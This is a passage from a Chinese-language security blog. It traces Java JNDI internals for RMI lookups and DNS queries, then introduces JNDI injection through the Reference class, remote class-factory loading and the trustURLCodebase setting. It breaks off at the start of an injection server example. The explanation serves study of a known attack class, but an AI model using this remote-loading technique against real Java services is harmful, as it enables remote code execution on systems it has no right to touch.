<p>但是这里就有不同地方了，这里跟进getURLSchema()方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410101919054.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010191946006"
	
	
></p>
<p>无疑这里会匹配到<code>:</code>和<code>/</code>特殊符号，所以现在会进入if条件语句而不是直接返回null。</p>
<p>在if语句中，进行了字符串的截取工作，所以会返回rmi这个字符串。</p>
<p>继续往后看：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410101926591.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010192644544"
	
	
></p>
<p>然后就会进入这个if语句，会调用NamingManage.getURLContext()方法（这里传入了rmi字符串和一个空的Hashtable类）：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410101945042.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010194507992"
	
	
></p>
<p>然后调用了getURLObject()方法：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410101946936.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010194603881"
	
	
></p>
<p>喔，getFactory()方法，感觉很像获取工厂类的方法，有搞头，此时的参数情况：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410101956581.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010195607536"
	
	
></p>
<p>这就已经看到了包含有rmiURLContextFactory的字符串，也是参数传递时确实应该形成的，跟进ResourceManager类的getFactory()方法，关键代码如下：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410102009195.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010200910150"
	
	
></p>
<p>parser.nextToken方法返回com.sun.jndi.url字符串，classSuffix就是传入的.rmi.rmiURLContextFactory，所以className变量定义如下：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410102009115.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010200932070"
	
	
></p>
<p>所以这里找到了工厂类并实例化，最后还返回了这个对象。</p>
<p>所以这里的getFactory()方法就是获取工厂类对象。</p>
<p>————</p>
<p>回到NamingManager类的getURLObject()方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410102014450.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010201448403"
	
	
></p>
<p>所以现在会调用工厂类rmiURLContextFactory类的getObjectInstance()方法，这里的参数分别为：（null、null、null、空的Hashtable类），跟进这个方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410102018239.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010201810186"
	
	
></p>
<p>所以就是实例化一个rmiURLContext类，传入了一个空的Hashtable类，将其父类的父类GenericURLContext的myEnv变量赋值为了Hashtable类。</p>
<p>所以之类的getURLObject()方法就是获取到一个rmiURLContext类。</p>
<p>————</p>
<p>回到NamingManager类的getURLContext类：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410102020769.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010202046715"
	
	
></p>
<p>毫无疑问这里符合第一个if条件，所以会返回这个rmiURLContext类</p>
<p>————</p>
<p>回到InitialContext类的getURLOrDefaultInitCtx()方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410102022244.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010202221189"
	
	
></p>
<p>符合条件，直接返回这个rmiURLContext类，不会像之前一样调用getDefaultInitCtx()方法。</p>
<p>综上所述，<strong>这里的getURLOrDefaultInitCtx(name)方法就是会得到一个rmiURLContext类</strong>，但是里面的Hashtable类为空。</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410102027872.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010202737823"
	
	
></p>
<p>————————</p>
<ul>
<li>lookup(name)：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410102025579.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010202546534"
	
	
></li>
</ul>
<p>跟进rmiURLContext类的lookup()方法（实际调用的是其父类GenericURLContext的lookup()方法）：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410102029836.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010202919781"
	
	
></p>
<p>前面也遇到过这个方法，和前面差不多了，var2为ResolveResult类对象，包含的两个变量（变量值有点不同）：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410102030267.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010203055221"
	
	
></p>
<p>后续的两个getter都是获取这里两个值，两个值的情况：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410102042815.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010204209763"
	
	
></p>
<p>调用了RegistryContext类的lookup()方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410102040945.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010204040896"
	
	
></p>
<p>跟进lookup()方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410102041922.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010204110868"
	
	
></p>
<p>所以会进入else语句，然后就会调用RegistryImpl_Stub类的lookup()方法查找“Hello”的服务：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410102044071.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010204427011"
	
	
></p>
<p>同样符合RMI的过程。</p>
<h3 id="jndi-dns服务">JNDI-DNS服务
</h3><p><code>JNDI</code>支持访问<code>DNS</code>服务，注册环境变量时设置<code>JNDI</code>服务处理的工厂类是<code>com.sun.jndi.dns.DnsContextFactory</code>类。</p>
<h4 id="基本代码-1">基本代码
</h4><p>DNS服务就是为了解析域名，代码和前面JNDI-RMI代码大相径庭：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">JNDI</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Hashtable</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.Context</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.directory.InitialDirContext</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.directory.DirContext</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.directory.Attributes</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">JNDI_Main</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Hashtable</span><span class="w"> </span><span class="n">env</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Hashtable</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">env</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">Context</span><span class="p">.</span><span class="na">INITIAL_CONTEXT_FACTORY</span><span class="p">,</span><span class="s">&#34;com.sun.jndi.dns.DnsContextFactory&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">env</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">Context</span><span class="p">.</span><span class="na">PROVIDER_URL</span><span class="p">,</span><span class="s">&#34;dns://114.114.114.114&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 创建JNDI目录服务对象</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">DirContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InitialDirContext</span><span class="p">(</span><span class="n">env</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 获取DNS解析记录测试</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Attributes</span><span class="w"> </span><span class="n">attrs1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">context</span><span class="p">.</span><span class="na">getAttributes</span><span class="p">(</span><span class="s">&#34;baidu.com&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;A&#34;</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">attrs1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>这里是从dns://114.114.114.114这个dns服务器上查询<code>www.baidu.com</code>域名的ip地址，这里用的是JNDI目录服务，目录服务允许目录对象具有属性，那么同样也可以有值。</p>
<p>同样的，还可以不设置环境变量，将其放进系统属性中，代码如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">JNDI</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Hashtable</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.Context</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.directory.InitialDirContext</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.directory.DirContext</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.directory.Attributes</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">JNDI_Main</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">setProperty</span><span class="p">(</span><span class="n">Context</span><span class="p">.</span><span class="na">INITIAL_CONTEXT_FACTORY</span><span class="p">,</span><span class="s">&#34;com.sun.jndi.dns.DnsContextFactory&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">setProperty</span><span class="p">(</span><span class="n">Context</span><span class="p">.</span><span class="na">PROVIDER_URL</span><span class="p">,</span><span class="s">&#34;dns://114.114.114.114&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 创建JNDI目录服务对象</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">DirContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InitialDirContext</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 获取DNS解析记录测试</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Attributes</span><span class="w"> </span><span class="n">attrs1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">context</span><span class="p">.</span><span class="na">getAttributes</span><span class="p">(</span><span class="s">&#34;baidu.com&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;A&#34;</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">attrs1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h4 id="源码分析-1">源码分析
</h4><h5 id="目录服务初始化上下文">目录服务初始化上下文
</h5><p>对应代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">DirContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InitialDirContext</span><span class="p">(</span><span class="n">env</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>跟进初始化过程：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410091940587.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009194030547"
	
	
></p>
<p>这里进行类的初始化的是InitialDirContext类，而它的父类是InitialContext类，所以这里其实还是初始化的InitialContext类，并同样传入了Hashtable类，只不过里面放入的值是不同的。</p>
<p>后面的具体过程还是和前面命名服务初始化差不多的，就从不一样的地方开始看看：</p>
<p>在NamingManage类的getInitialContext()方法中，最后会调用DnsContextFactory类的getInitialContext()方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410092005750.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009200548715"
	
	
></p>
<p>然后调用DnsContextFactory类的ulToContext()方法，参数分别为dns://114.114.114.114、DNS服务的Hashtable类：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410092008154.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009200844094"
	
	
></p>
<p>最后会调用getContext()方法，参数分别为：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410092011198.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009201114160"
	
	
></p>
<p>继续跟进：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410092012536.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009201221489"
	
	
></p>
<p>所以这里是初始化了一个DnsContext类，进行了一些赋值操作：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410092014070.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009201416025"
	
	
></p>
<p>最后返回了这个DnsContext类实例。</p>
<p>所以这里的步骤同样是将InitialDiContext类的父类InitialContext类变量defaultInitCtx变量赋值为DnsContext类实例，并将gotDefault变量赋值为tue。</p>
<p>——————</p>
<h5 id="目录服务获取属性">目录服务获取属性
</h5><p>对应代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Attributes</span><span class="w"> </span><span class="n">attrs1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">context</span><span class="p">.</span><span class="na">getAttributes</span><span class="p">(</span><span class="s">&#34;baidu.com&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;A&#34;</span><span class="p">});</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>在前面的初始化后，现在的context值是一个InitialDiContext类，变量定义为：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410092019252.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009201917201"
	
	
></p>
<p>所以现在会调用InitialDiContext类的getAttibutes()方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410092021639.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009202120601"
	
	
></p>
<p>还是两个点，</p>
<ul>
<li>先跟进<code>getURLOrDefaultInitDirCtx(name)</code>：</li>
</ul>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410092022667.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009202219624"
	
	
></p>
<p>跟进这里的getURLOrDefaultInitCtx()方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410092024295.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009202412245"
	
	
></p>
<p>还是同样的，会直接调用最后的getDefaultInitCtx()方法，前面的代码跟一下源码即可，挺好看懂的：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410092025743.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009202522700"
	
	
></p>
<p>同样的直接返回DnsContext类实例。并且在InitialDirContext类的getURLOrDefaultInitDirCtx()方法也是直接返回这个DnsContext类实例：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410092027785.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009202736738"
	
	
></p>
<p>所以这里的第一个点就是获取DnsContext类实例。</p>
<p>————</p>
<ul>
<li>跟进<code>getAttributes(name, attrIds)</code>代码：</li>
</ul>
<p>所以现在是会调用DnsContext类的父类的父类PartialCompositeDirContext的getAttibutes()方法，跟进：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410092029432.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009202942392"
	
	
></p>
<p>还是先简单看一下CompositeName类的初始化：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410092058111.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009205840068"
	
	
></p>
<p>同样的还是将CompositeName类的impl变量赋值为这个。</p>
<p>但其实可以直接看作badidu.com，继续跟代码，所以现在会调用另一个重载的getAttributes()方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410092103557.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009210328504"
	
	
></p>
<p>按顺序简单说说：</p>
<ul>
<li>
<p>先是将这里的var3变量赋值为了DnsContext类实例。</p>
</li>
<li>
<p>然后调用了p_getEnvironment()方法，实际上会调用DnsContext类的这个方法：</p>
</li>
</ul>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410092134648.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009213434608"
	
	
></p>
<p>直接返回了Hashtable类实例。</p>
<ul>
<li>然后实例化了一个Continuation类：</li>
</ul>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410092136397.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009213640353"
	
	
></p>
<p>传入了这个字符串和Hashtable类实例。</p>
<ul>
<li>然后到了for循环，会调用DnsContext父类ComponentDirContext的p_getAttributes()方法：</li>
</ul>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410092141498.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009214117449"
	
	
></p>
<p>这里的var4变量是一个HeadTail类实例，后续的HeadTail.getStatus返回2，会调用c_getAttributes方法（getHead()方法返回的是“baidu.com&quot;）：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410092145856.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009214539807"
	
	
></p>
<p>查询逻辑为：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410092148474.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009214857434"
	
	
></p>
<p>所以这里实际会调用DnsClient类的quey()方法，然后又会调用到doUdpQuery()方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410092154917.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009215404857"
	
	
></p>
<p>前面的send()方法就是进行连接，发送请求到相应的DNS服务器，后一个就是获取数据。</p>
<p>最后query()方法结束获得的数据：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410092156025.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009215644983"
	
	
></p>
<p>最后得到数据：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410092158736.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241009215841697"
	
	
></p>
<p>——————————</p>
<h2 id="jndi攻击">JNDI攻击
</h2><p>在学习JNDI攻击前，先简单了解两个知识点。</p>
<h3 id="前置知识了解">前置知识了解
</h3><h4 id="reference类了解">Reference类了解
</h4><p>该类位于<code>javax.naming.Reference</code>，该类表示对在命名/目录系统外部找到的对象的引用。提供了JNDI中类的引用功能。</p>
<p>一个示例代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;http://127.0.0.1:8080&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Reference</span><span class="w"> </span><span class="n">reference</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Reference</span><span class="p">(</span><span class="s">&#34;test&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;test&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">url</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>利用的构造函数：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410102120161.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010212059085"
	
	
></p>
<p>这里涉及到的三个变量:</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410102123870.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010212343809"
	
	
></p>
<p>就是将这个类的这三个参数赋值为对应的参数。</p>
<p>就利用来说，三个参数可以如下理解：</p>
<ul>
<li>className：远程加载时所使用的类名，本地找不到，就去远程加载</li>
<li>classFactory：加载<code>class</code>中需要实例化类的名称</li>
<li>classFactoryLocation：工厂加载的地址，提供classes数据的地址（可以是<code>file/ftp/http</code>协议）</li>
</ul>
<p>后面用一个实例来说明一下利用。</p>
<h4 id="远程对象引用安全限制">远程对象引用安全限制
</h4><p>RMI服务中引用远程对象将受本地Java环境的限制，需要java.rmi.server.useCodebaseOnly配置必须为false，表示允许加载除了Classpath外的远程对象。</p>
<p>而在JNDI获取RMI服务中，被引用的远程工厂对象也将受com.sun.jndi.rmi.object.trustURLCodebase配置限制，为false表示不信任远程引用对象，就不能调用远程的引用对象</p>
<h3 id="jndi-rmi注入">JNDI-RMI注入
</h3><h4 id="示例代码">示例代码
</h4><p>先给注入方法操作一下：</p>
<ul>
<li>RMI Server端代码：</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">JNDI</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.jndi.rmi.registry.ReferenceWrapper</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.NamingException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.Reference</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.AlreadyBoundException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.RemoteException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.LocateRegistry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.Registry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">JNDI_RMI_Server</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">RemoteException</span><span class="p">,</span><span class="w"> </span><span class="n">NamingException</span><span class="p">,</span><span class="w"> </span><span class="n">AlreadyBoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
